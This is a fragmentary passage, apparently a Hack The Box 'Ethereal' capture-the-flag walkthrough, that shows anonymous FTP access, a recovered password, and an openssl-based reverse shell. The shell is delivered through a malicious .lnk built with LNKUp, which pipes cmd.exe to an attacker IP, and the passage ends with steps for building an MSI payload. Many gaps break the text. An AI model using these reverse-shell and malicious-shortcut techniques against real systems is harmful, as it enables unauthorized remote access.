...
<img src="/public/images/2019-03-21/ethereal_badge.png"><br>
## Explanation:
...
Name (10.10.10.106:sabonawa): anonymous
...
![placeholder](https://inar1.github.io/public/images/2019-02-27/2019-02-25-11-09-32.png)
...
List:
{% highlight shell %}
root@kali:/home/sabonawa/hackTB/work# cat strings.txt 
7oth3B@tC4v3!
...
{% highlight shell %}
root@kali:/home/sabonawa/inar1.github.io/_posts# tcpdump -i tun0 icmp
...
{% highlight shell %}
root@kali:/home/sabonawa# openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
...
root@kali:/home/sabonawa# openssl s_server -quiet -key key.pem -cert cert.pem -port 73
...
{% highlight shell %}
root@kali:/home/sabonawa/LNKUp# python generate.py --host localhost --type ntlm --out vs-mod.lnk --execute "C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.23:73|cmd.exe|C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.23:136"
\
  ~==================================================~
##                                                    ##
##  /$$       /$$   /$$ /$$   /$$ /$$   /$$           ##
...
File saved to /home/sabonawa/LNKUp/vs-mod.lnk
...
{% highlight shell %}
root@kali:/home/sabonawa# openssl s_server -quiet -key key.pem -cert cert.pem -port 136 < vs-mod.lnk
# then, run following payload to upload shell
...
{% highlight shell %}
root@kali:/home/sabonawa# openssl s_server -quiet -key key.pem -cert cert.pem -port 136
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.
...
#### Create a msi file
We can use <a href="https://emcosoftware.com/msi-package-builder">EMCO MSI Package Builder</a> to create a new msi file.<br>
After its installation, by clicking "New", we can create a new project.
![placeholder](https://inar1.github.io/public/images/2019-02-27/2019-02-26-11-09-32.png)

Then, go to "Project" -> "Custom Actions" -> "New Pre & Post Action" and put following parameters.
![placeholder](https://inar1.github.io/public/images/2019-02-27/2019-02-26-11-09-32.png)

After that, click on "Create MSI Package".<br>
We can find a .msi file in specified path.
![placeholder](https://inar1.github.io/public/images/2019-02-27/2019-02-26-11-09-32.png)
